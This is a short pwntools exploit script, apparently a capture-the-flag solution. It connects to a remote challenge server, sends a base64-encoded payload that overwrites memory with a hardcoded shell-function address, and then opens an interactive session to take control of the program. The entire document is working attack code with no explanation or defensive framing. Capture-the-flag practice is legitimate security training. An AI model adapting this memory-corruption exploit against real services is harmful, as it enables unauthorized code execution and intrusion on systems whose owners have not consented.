from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28264)
input_addr = 0x811EB40
shell = 0x8049284
payload = 'aaaa' + p32(shell) + p32(input_addr)
payload = payload.encode('base64')
io.sendlineafter(": ",payload)
io.interactive()
